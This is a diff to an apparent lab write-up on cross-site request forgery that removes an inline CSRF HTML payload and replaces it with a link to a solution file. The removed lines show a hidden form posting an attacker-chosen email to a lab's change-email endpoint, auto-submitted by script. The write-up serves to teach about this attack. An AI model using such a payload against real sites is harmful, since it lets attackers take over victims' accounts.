@@ -26,20 +26,8 @@ We host a server that will respond with malicious HTML from a /GET request. The 
 forge a POST request to the target web app, changing the email address of the user currently logged
 in - this occurs because the browser will reuse cookies for the target domain.
 
-Below is the CSRF HTML payload we use to solve this lab:
 
-
-<html>
-  <body>
-    <form action="https://1.web-security-academy.net/my-account/change-email" method="POST">
-      <input type="hidden" name="email" value="pwned&#64;evil&#45;user&#46;net" />
-    </form>
-    <script>
-      history.pushState('', '', '/');
-      document.forms[0].submit();
-    </script>
-  </body>
-</html>
+<a href="1.txt">Solution</a>
 
 
 
